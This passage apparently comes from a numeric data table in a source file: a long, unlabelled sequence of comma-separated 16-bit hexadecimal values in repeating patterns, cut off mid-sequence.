0x0001, 0x01ED, 0x01ED, 0x0007, 0x0007, 0x0007, 0x0004, 0x2000, 0x2000, 0x0007, 0x0007, 0x0007, 0x0003, 0x0200, 0x0200, 0x0007, 0x0007, 0x0007, 0x0000, 0x0202, 0x0001, 0x0201, 0x0201, 0x0007, 0x0007, 0x0007, 0x0004, 0x1FF6, 0x1FF6, 0x0007, 0x0007, 0x0007, 0x0003, 0x0214, 0x0214, 0x0007, 0x0007, 0x0007, 0x0000, 0x0216, 0x0001, 0x0215, 0x0215, 0x0007, 0x0007, 0x0007, 0x0004, 0x1FF9, 0x1FF9, 0x0007, 0x0007, 0x0007, 0x0003, 0x0228, 0x0228, 0x0007, 0x0007, 0x0007, 0x0000, 0x022A, 0x0001, 0x0229, 0x0229, 0x0007, 0x0007, 0x0007, 0x0004, 0x2001, 0x2001, 0x0007, 0x0007, 0x0007, 0x0003, 0x023C, 0x023C, 0x0007, 0x0007, 0x0007, 0x0000, 0x023E, 0x0001, 0x023D, 0x023D, 0x0007, 0x0007, 0x0007, 0x0004, 0x1FEE, 0x1FEE, 0x0007, 0x0007, 0x0007, 0x0003, 0x0250, 0x0250, 0x0007, 0x0007, 0x0007, 0x0000, 0x0252, 0x0001, 0x0251, 0x0251, 0x0007, 0x0007, 0x0007, 0x0004, 0x2000, 0x2000, 0x0007, 0x0007, 0x0007, 0x0003, 0x0264, 0x0264, 0x0007, 0x0007, 0x0007, 0x0000, 0x0266, 0x0001, 0x0265, 0x0265, 0x0007, 0x0007, 0x0007, 0x0004, 0x1FED, 0x1FED, 0x0007, 0x0007, 0x0007, 0x0003, 0x0278, 0x0278, 0x0007, 0x0007, 0x0007, 0x0000, 0x027A, 0x0001, 0x0279, 0x0279, 0x0007, 0x0007, 0x0007, 0x0004, 0x1FF9, 0x1FF9, 0x0007, 0x0007, 0x0007, 0x0003, 0x028C, 0x028C, 0x0007, 0x0007, 0x0007, 0x0000, 0x028E, 0x0001, 0x028D, 0x028D, 0x0007, 0x0007, 0x0007, 0x0004, 0x1FFB, 0x1FFB, 0x0007, 0x0007, 0x0007, 0x0003, 0x02A0, 0x02A0, 0x0007, 0x0007, 0x0007, 0x0000, 0x02A2, 0x0001, 0x02A1, 0x02A1, 0x0007, 0x0007, 0x0007, 0x0004, 0x1FEF, 0x1FEF, 0x0007, 0x0007, 0x0007, 0x0003, 0x02B4, 0x02B4, 0x0007, 0x0007, 0x0007, 0x0000, 0x02B6, 0x0001, 0x02B5, 0x02B5, 0x0007, 0x0007, 0x0007, 0x0004, 0x1FF1, 0x1FF1, 0x0007, 0x0007, 0x0007, 0x0003, 0x02C8, 0x02C8, 0x0007, 0x0007, 0x0007, 0x0000, 0x02CA, 0x0001, 0x02C9, 0x02C9, 0x0007, 0x0007, 0x0007, 0x0004, 0x1FF7, 0x1FF7, 0x0007, 0x0007, 0x0007, 0x0003, 0x02DC, 0x02DC, 0x0007, 0x0007, 0x0007, 0x0000, 0x02DE, 0x0001, 0x02DD, 0x02DD, 0x0007, 0x0007, 0x0007, 0x0004, 0x1FF8, 0x1FF8, 0x0007, 0x0007, 0x0007, 0x0003, 0x02F0, 0x02F0, 0x0007, 0x0007, 0x0007, 0x0000, 0x02F2, 0x0001, 0x02F1, 0x02F1, 0x0007, 0x0007, 0x0007, 0x0004, 0x02FE, 0x02FE, 0x0007, 0x0007, 0x0007, 0x0000, 0x0300, 0x0307, 0x02FF, 0x02FF, 0x0007, 0x0007, 0x0007, 0x0000, 0x0000, 0x030D, 0x030D, 0x0007, 0x0007, 0x0007, 0x0000, 0x030F, 0x0001, 0x030E, 0x030E, 0x0007, 0x0007, 0x0007, 0x0006, 0x0005, 0x0005, 0x0007, 0x0007, 0x0007, 0x1FC7, 0x0321, 0x0321, 0x0007, 0x0007, 0x0007, 0x0000, 0x0323, 0x0001, 0x0322, 0x0322, 0x0007, 0x0007, 0x0007, 0x0006, 0x0005, 0x0005, 0x0007, 0x0007, 0x0007, 0x1FC8, 0x0335, 0x0335, 0x0007, 0x0007, 0x0007, 0x0000, 0x0337, 0x0001, 0x0336, 0x0336, 0x0007, 0x0007, 0x0007, 0x0006, 0x0005, 0x0005, 0x0007, 0x0007, 0x0007, 0x1FC9, 0x0349, 0x0349, 0x0007, 0x0007, 0x0007, 0x0000, 0x034B, 0x0001, 0x034A, 0x034A, 0x0007, 0x0007, 0x0007, 0x0006, 0x0005, 0x0005, 0x0007, 0x0007, 0x0007, 0x1FCA, 0x035D, 0x035D, 0x0007, 0x0007, 0x0007, 0x0000, 0x035F, 0x0001, 0x035E, 0x035E, 0x0007, 0x0007, 0x0007, 0x0006, 0x0005, 0x0005, 0x0007, 0x0007, 0x0007, 0x1FCB, 0x0371, 0x0371, 0x0007, 0x0007, 0x0007, 0x0000, 0x0373, 0x0001, 0x0372, 0x0372, 0x0007, 0x0007, 0x0007, 0x0006, 0x0005, 0x0005, 0x0007, 0x0007, 0x0007, 0x1FCC, 0x0385, 0x0385, 0x0007, 0x0007, 0x0007, 0x0000, 0x0387, 0x0001, 0x0386, 0x0386, 0x0007, 0x0007, 0x0007, 0x0006, 0x0005, 0x0005, 0x0007, 0x0007, 0x0007, 0x1FCD, 0x0399, 0x0399, 0x0007, 0x0007, 0x0007, 0x0000, 0x039B, 0x0001, 0x039A, 0x039A, 0x0007, 0x0007, 0x0007, 0x0006, 0x0005, 0x0005, 0x0007, 0x0007, 0x0007, 0x1FCE, 0x03AD, 0x03AD, 0x0007, 0x0007, 0x0007, 0x0000, 0x03AF, 0x0001, 0x03AE, 0x03AE, 0x0007, 0x0007, 0x0007, 0x0006, 0x0005, 0x0005, 0x0007, 0x0007, 0x0007, 0x1FCF, 0x03C1, 0x03C1, 0x0007, 0x0007, 0x0007, 0x0000, 0x03C3, 0x0001, 0x03C2, 0x03C2, 0x0007, 0x0007, 0x0007, 0x0006, 0x0005, 0x0005, 0x0007, 0x0007, 0x0007, 0x1FD0, 0x03D5, 0x03D5, 0x0007, 0x0007, 0x0007, 0x0000, 0x03D7, 0x0001, 0x03D6, 0x03D6, 0x0007, 0x0007, 0x0007, 0x0006, 0x0005, 0x0005, 0x0007, 0x0007, 0x0007, 0x1FD1, 0x03E9, 0x03E9, 0x0007, 0x0007, 0x0007, 0x0000, 0x03EB, 0x0001, 0x03EA, 0x03EA, 0x0007, 0x0007, 0x0007, 0x0006, 0x0005, 0x0005, 0x0007, 0x0007, 0x0007, 0x1FD2, 0x03FD, 0x03FD, 0x0007, 0x0007, 0x0007, 0x0000, 0x03FF, 0x0001, 0x03FE, 0x03FE, 0x0007, 0x0007, 0x0007, 0x0006, 0x0005, 0x0005, 0x0007, 0x0007, 0x0007, 0x1FD3, 0x0411, 0x0411, 0x0007, 0x0007, 0x0007, 0x0000, 0x0413, 0x0001, 0x0412, 0x0412, 0x0007, 0x0007, 0x0007, 0x0006, 0x0005, 0x0005, 0x0007, 0x0007, 0x0007, 0x1FD4, 0x0425, 0x0425, 0x0007, 0x0007, 0x0007, 0x0000, 0x0427, 0x0001, 0x0426, 0x0426, 0x0007, 0x0007, 0x0007, 0x0006, 0x0005, 0x0005, 0x0007, 0x0007, 0x0007, 0x1FD5, 0x0439, 0x0439, 0x0007, 0x0007, 0x0007, 0x0000, 0x043B, 0x0001, 0x043A, 0x043A, 0x0007, 0x0007, 0x0007, 0x0006, 0x0005, 0x0005, 0x0007, 0x0007, 0x0007, 0x1FD6, 0x044D, 0x044D, 0x0007, 0x0007, 0x0007, 0x0000, 0x044F, 0x0001, 0x044E, 0x044E, 0x0007, 0x0007, 0x0007, 0x0006, 0x0005, 0x0005, 0x0007, 0x0007, 0x0007, 0x1FD7, 0x0461, 0x0461, 0x0007, 0x0007, 0x0007, 0x0000, 0x0463, 0x0001, 0x0462, 0x0462, 0x0007, 0x0007, 0x0007, 0x0006, 0x0005, 0x0005, 0x0007, 0x0007, 0x0007, 0x1FD8, 0x0475, 0x0475, 0x0007, 0x0007, 0x0007, 0x0000, 0x0477, 0x0001, 0x0476, 0x0476, 0x0007, 0x0007, 0x0007, 0x0006, 0x0005, 0x0005, 0x0007, 0x0007, 0x0007, 0x1FD9, 0x0489, 0x0489, 0x0007, 0x0007, 0x0007, 0x0000, 0x048B, 0x0001, 0x048A, 0x048A, 0x0007, 0x0007, 0x0007, 0x0006, 0x0005, 0x0005, 0x0007, 0x0007, 0x0007, 0x1FDA, 0x049D, 0x049D, 0x0007, 0x0007, 0x0007, 0x0000, 0x049F, 0x0001, 0x049E, 0x049E, 0x0007, 0x0007, 0x0007, 0x0006, 0x0005, 0x0005, 0x0007, 0x0007, 0x0007, 0x1FDB, 0x04B1, 0x04B1, 0x0007, 0x0007, 0x0007, 0x0000, 0x04B3, 0x0001, 0x04B2, 0x04B2, 0x0007, 0x0007, 0x0007, 0x0006, 0x0005, 0x0005, 0x0007, 0x0007, 0x0007, 0x1FDC, 0x04C5, 0x04C5, 0x0007, 0x0007, 0x0007, 0x0000, 0x04C7, 0x0001, 0x04C6, 0x04C6, 0x0007, 0x0007, 0x0007, 0x0006, 0x0005, 0x0005, 0x0007, 0x0007, 0x0007, 0x1FDD, 0x04D9, 0x04D9, 0x0007, 0x0007, 0x0007, 0x0000, 0x04DB, 0x0001, 0x04DA, 0x04DA, 0x0007, 0x0007, 0x0007, 0x0006, 0x0005, 0x0005, 0x0007, 0x0007, 0x0007, 0x1FDE, 0x04ED, 0x04ED, 0x0007, 0x0007, 0x0007, 0x0000, 0x04EF, 0x0001, 0x04EE, 0x04EE, 0x0007, 0x0007, 0x0007, 0x0006, 0x0005, 0x0005, 0x0007, 0x0007, 0x0007, 0x1FDF, 0x0501, 0x0501, 0x0007, 0x0007, 0x0007, 0x0000, 0x0503, 0x0001, 0x0502, 0x0502, 0x0007, 0x0007, 0x0007, 0x0006, 0x0005, 0x0005, 0x0007, 0x0007, 0x0007, 0x1FE0, 0x0515, 0x0515, 0x0007, 0x0007, 0x0007, 0x0000, 0x0517, 0x0001, 0x0516, 0x0516, 0x0007, 0x0007, 0x0007, 0x0006, 0x0005, 0x0005, 0x0007, 0x0007, 0x0007, 0x1FE1, 0x0529, 0x0529, 0x0007, 0x0007, 0x0007, 0x0000, 0x052B, 0x0001, 0x052A, 0x052A, 0x0007, 0x0007, 0x0007, 0x0006, 0x0005, 0x0005, 0x0007, 0x0007, 0x0007, 0x1FE2, 0x053D, 0x053D, 0x0007, 0x0007, 0x0007, 0x0000, 0x053F, 0x0001, 0x053E, 0x053E, 0x0007, 0x0007, 0x0007, 0x0006, 0x0005, 0x0005, 0x0007, 0x0007, 0x0007, 0x1FE3, 0x0551, 0x0551, 0x0007, 0x0007, 0x0007, 0x0000, 0x0553, 0x0001, 0x0552, 0x0552, 0x0007, 0x0007, 0x0007, 0x0006, 0x0005, 0x0005, 0x0007, 0x0007, 0x0007, 0x1FE4, 0x0565, 0x0565, 0x0007, 0x0007, 0x0007, 0x0000, 0x0567, 0x0001, 0x0566, 0x0566, 0x0007, 0x0007, 0x0007, 0x0006, 0x0005, 0x0005, 0x0007, 0x0007, 0x0007, 0x1FE5, 0x0579, 0x0579, 0x0007, 0x0007, 0x0007, 0x0000, 0x057B, 0x0001, 0x057A, 0x057A, 0x0007, 0x0007, 0x0007, 0x0006, 0x0005, 0x0005, 0x0007, 0x0007, 0x0007, 0x1FE6, 0x058D, 0x058D, 0x0007, 0x0007, 0x0007, 0x0000, 0x058F, 0x0001, 0x058E, 0x058E, 0x0007, 0x0007, 0x0007, 0x0006, 0x0005, 0x0005, 0x0007, 0x0007, 0x0007, 0x1FE7, 0x05A1, 0x05A1, 0x0007, 0x0007, 0x0007, 0x0000, 0x05A3, 0x0001, 0x05A2, 0x05A2, 0x0007, 0x0007, 0x0007, 0x0006, 0x0005, 0x0005, 0x0007, 0x0007, 0x0007, 0x1FE8, 0x05B5, 0x05B5, 0x0007, 0x0007, 0x0007, 0x0000, 0x05B7, 0x0001, 0x05B6, 0x05B6, 0x0007, 0x0007, 0x0007, 0x0006, 0x0005, 0x0005, 0x0007, 0x0007, 0x0007, 0x1FE9, 0x05C9, 0x05C9, 0x0007, 0x0007, 0x0007, 0x0000, 0x05CB, 0x0001, 0x05CA, 0x05CA, 0x0007, 0x0007, 0x0007, 0x0006, 0x0005, 0x0005, 0x0007, 0x0007, 0x0007, 0x1FEA, 0x05DD, 0x05DD, 0x0007, 0x0007, 0x0007, 0x0000, 0x05DF, 0x0001, 0x05DE, 0x05DE, 0x0007, 0x0007, 0x0007, 0x0006, 0x0005, 0x0005, 0x0007, 0x0007, 0x0007, 0x1FEB, 0x05F1, 0x05F1, 0x0007, 0x0007, 0x0007, 0x0000, 0x05F3, 0x0001, 0x05F2, 0x05F2, 0x0007, 0x0007, 0x0007, 0x0006, 0x0005, 0x0005, 0x0007, 0x0007, 0x0007, 0x1FEC, 0x1FC7, 0x1FC7, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x06BF, 0x06BF, 0x0007, 0x0007, 0x0007, 0x0000, 0x06C2, 0x0000, 0x0000, 0x1F99, 0x1F99, 0x06C0, 0x1FAA, 0x1FAA, 0x06C1, 0x06CE, 0x06CE, 0x0007, 0x0007, 0x0007, 0x0000, 0x06D1, 0x0000, 0x0000, 0x1F99, 0x1F99, 0x06CF, 0x06C1, 0x06C1, 0x06D0, 0x06CF, 0x06D0, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x06C1, 0x06E6, 0x06E6, 0x0007, 0x0007, 0x0007, 0x0000, 0x06E9, 0x0000, 0x0000, 0x1FAA, 0x1FAA, 0x06E7, 0x06C0, 0x06C0, 0x06E8, 0x06E7, 0x06E8, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x06C0, 0x06C0, 0x06C1, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x0306, 0x0007, 0x0007, 0x0007, 0x0306, 0x1FC8, 0x1FC8, 0x0007, 0x0007, 0x0007, 0x1FC8, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0716, 0x0716, 0x0007, 0x0007, 0x0007, 0x0000, 0x0719, 0x0000, 0x0000, 0x1F99, 0x1F99, 0x0717, 0x1FA9, 0x1FA9, 0x0718, 0x0725, 0x0725, 0x0007, 0x0007, 0x0007, 0x0000, 0x0728, 0x0000, 0x0000, 0x1F99, 0x1F99, 0x0726, 0x0718, 0x0718, 0x0727, 0x0726, 0x0727, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0718, 0x073D, 0x073D, 0x0007, 0x0007, 0x0007, 0x0000, 0x0740, 0x0000, 0x0000, 0x1FA9, 0x1FA9, 0x073E, 0x0717, 0x0717, 0x073F, 0x073E, 0x073F, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0717, 0x0717, 0x0718, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x0306, 0x0007, 0x0007, 0x0007, 0x0306, 0x0761, 0x0761, 0x0007, 0x0007, 0x0007, 0x0000, 0x0764, 0x0000, 0x0000, 0x1FC9, 0x1FC9, 0x0762, 0x1FA2, 0x1FA2, 0x0763, 0x0770, 0x0770, 0x0007, 0x0007, 0x0007, 0x0000, 0x0773, 0x0000, 0x0000, 0x1FC9, 0x1FC9, 0x0771, 0x0763, 0x0763, 0x0772, 0x0771, 0x0772, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0763, 0x0788, 0x0788, 0x0007, 0x0007, 0x0007, 0x0000, 0x078B, 0x0000, 0x0000, 0x1FA2, 0x1FA2, 0x0789, 0x0762, 0x0762, 0x078A, 0x0789, 0x078A, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0762, 0x0762, 0x0763, 0x0007, 0x0007, 0x0007, 0x1F99, 0x07A6, 0x07A6, 0x0007, 0x0007, 0x0007, 0x0000, 0x07A9, 0x0000, 0x0000, 0x1F99, 0x1F99, 0x07A7, 0x1FB8, 0x1FB8, 0x07A8, 0x07B5, 0x07B5, 0x0007, 0x0007, 0x0007, 0x0000, 0x07B8, 0x0000, 0x0000, 0x1F99, 0x1F99, 0x07B6, 0x07A8, 0x07A8, 0x07B7, 0x07B6, 0x07B7, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x07A8, 0x07CD, 0x07CD, 0x0007, 0x0007, 0x0007, 0x0000, 0x07D0, 0x0000, 0x0000, 0x1FB8, 0x1FB8, 0x07CE, 0x07A7, 0x07A7, 0x07CF, 0x07CE, 0x07CF, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x07A7, 0x07A7, 0x07A8, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x0306, 0x0007, 0x0007, 0x0007, 0x0306, 0x1FCA, 0x1FCA, 0x0007, 0x0007, 0x0007, 0x1FCA, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x07FD, 0x07FD, 0x0007, 0x0007, 0x0007, 0x0000, 0x0800, 0x0000, 0x0000, 0x1F99, 0x1F99, 0x07FE, 0x1F9B, 0x1F9B, 0x07FF, 0x080C, 0x080C, 0x0007, 0x0007, 0x0007, 0x0000, 0x080F, 0x0000, 0x0000, 0x1F99, 0x1F99, 0x080D, 0x07FF, 0x07FF, 0x080E, 0x080D, 0x080E, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x07FF, 0x0824, 0x0824, 0x0007, 0x0007, 0x0007, 0x0000, 0x0827, 0x0000, 0x0000, 0x1F9B, 0x1F9B, 0x0825, 0x07FE, 0x07FE, 0x0826, 0x0825, 0x0826, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x07FE, 0x07FE, 0x07FF, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x0306, 0x0007, 0x0007, 0x0007, 0x0306, 0x1FCB, 0x1FCB, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0902, 0x0902, 0x0007, 0x0007, 0x0007, 0x0000, 0x0905, 0x0000, 0x0000, 0x1F99, 0x1F99, 0x0903, 0x1FAC, 0x1FAC, 0x0904, 0x0911, 0x0911, 0x0007, 0x0007, 0x0007, 0x0000, 0x0914, 0x0000, 0x0000, 0x1F99, 0x1F99, 0x0912, 0x0904, 0x0904, 0x0913, 0x0912, 0x0913, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0904, 0x0929, 0x0929, 0x0007, 0x0007, 0x0007, 0x0000, 0x092C, 0x0000, 0x0000, 0x1FAC, 0x1FAC, 0x092A, 0x0903, 0x0903, 0x092B, 0x092A, 0x092B, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0903, 0x0903, 0x0904, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x0306, 0x0007, 0x0007, 0x0007, 0x0306, 0x1FCC, 0x1FCC, 0x0007, 0x0007, 0x0007, 0x1FCC, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0959, 0x0959, 0x0007, 0x0007, 0x0007, 0x0000, 0x095C, 0x0000, 0x0000, 0x1F99, 0x1F99, 0x095A, 0x1FA0, 0x1FA0, 0x095B, 0x0968, 0x0968, 0x0007, 0x0007, 0x0007, 0x0000, 0x096B, 0x0000, 0x0000, 0x1F99, 0x1F99, 0x0969, 0x095B, 0x095B, 0x096A, 0x0969, 0x096A, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x095B, 0x0980, 0x0980, 0x0007, 0x0007, 0x0007, 0x0000, 0x0983, 0x0000, 0x0000, 0x1FA0, 0x1FA0, 0x0981, 0x095A, 0x095A, 0x0982, 0x0981, 0x0982, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x095A, 0x095A, 0x095B, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x0306, 0x0007, 0x0007, 0x0007, 0x0306, 0x1FCD, 0x1FCD, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x1F99, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0A5E, 0x0A5E, 0x0007, 0x0007, 0x0007, 0x0000, 0x0A61, 0x0000, 0x0000, 0x1F99, 0x1F99, 0x0A5F, 0x1FB5, 0x1FB5, 0x0A60, 0x0A6D, 0x0A6D, 0x0007, 0x0007, 0x0007, 0x0000, 0x0A70, 0x0000, 0x0000, 0x1F99, 0x1F99, 0x0A6E, 0x0A60, 0x0A60, 0x0A6F, 0x0A6E, 0x0A6F, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0A60, 0x0A85, 0x0A85, 0x0007, 0x0007, 0x0007, 0x0000, 0x0A88, 0x0000, 0x0000, 0x1FB5, 0x1FB5, 0x0A86, 0x0A5F, 0x0A5F, 0x0A87, 0x0A86, 0x0A87, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0A5F, 0x0A5F, 0x0A60, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x0306, 0x0007, 0x0007, 0x0007, 0x0306, 0x1FCE, 0x1FCE, 0x0007, 0x0007, 0x0007, 0x1FCE, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0AB5, 0x0AB5, 0x0007, 0x0007, 0x0007, 0x0000, 0x0AB8, 0x0000, 0x0000, 0x1F99, 0x1F99, 0x0AB6, 0x1FA5, 0x1FA5, 0x0AB7, 0x0AC4, 0x0AC4, 0x0007, 0x0007, 0x0007, 0x0000, 0x0AC7, 0x0000, 0x0000, 0x1F99, 0x1F99, 0x0AC5, 0x0AB7, 0x0AB7, 0x0AC6, 0x0AC5, 0x0AC6, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0AB7, 0x0ADC, 0x0ADC, 0x0007, 0x0007, 0x0007, 0x0000, 0x0ADF, 0x0000, 0x0000, 0x1FA5, 0x1FA5, 0x0ADD, 0x0AB6, 0x0AB6, 0x0ADE, 0x0ADD, 0x0ADE, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0AB6, 0x0AB6, 0x0AB7, 0x0007, 0x0007, 0x0007, 0x1F99, 0x1F99, 0x0306, 0x0007, 0x0007, 0x0007, 0x0306, 0x1FCF, 0x1FCF, 0x0007, 0x0007, 0x0007, 0x1FCF, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x1F99, 0x0B0C, 0x0B0C, 0x0007, 0x0007, 0x0007, 0x0000, 0x0B0F, 0x0000, 0x0000, 0x1F99, 0x1F99, 0x0B0D, 0x1FC1, 0x1FC1, 0x0B0E, 0x0B1B, 0x0B1B, 0x0007, 0x0007, 0x0007, 0x0000, 0x0B1E, 0x0000, 0x0000, 0x1F99, 0x1F99, 0x0B1C, 0x0B0E, 0x0B0E, 0x0B1D, 0x0B1C, 0x0B1D, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0B0E, 0x0B33, 0x0B33, 0x0007, 